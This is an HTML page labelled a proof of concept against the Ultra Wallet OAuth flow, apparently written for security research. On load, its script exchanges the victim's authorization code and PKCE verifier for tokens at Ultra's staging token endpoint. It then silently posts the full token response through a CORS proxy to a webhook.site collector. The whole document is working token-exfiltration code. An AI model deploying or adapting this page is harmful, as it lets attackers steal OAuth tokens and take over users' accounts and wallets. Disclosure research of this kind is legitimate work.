<!DOCTYPE html>
<html>
<head>
  <title>Ultra Wallet PoC - Callback</title>
</head>
<body>
  <h1>✅ Callback Received</h1>
  <pre id="result">Waiting...</pre>

  <!-- ⬇️ Move the script to the very end -->
  <script>
    async function exchangeCode() {
      const urlParams = new URLSearchParams(window.location.search);
      const code = urlParams.get("code");
      const codeVerifier = sessionStorage.getItem("code_verifier");

      const data = new URLSearchParams({
        grant_type: "authorization_code",
        client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
        code,
        code_verifier: codeVerifier,
        redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
      });

      const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data
      });

      const result = await response.json();

      // ✅ Make sure the element exists
      const resultElem = document.getElementById("result");
      if (resultElem) {
        resultElem.textContent = JSON.stringify(result, null, 2);
      }

      // ✅ Send to webhook using proxy
      fetch("https://corsproxy.io/?" + encodeURIComponent("	https://webhook.site/3cb3a784-1b93-4258-9437-ddbdfd2db388"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(result)
      });
    }

    exchangeCode();
  </script>
</body>
</html>
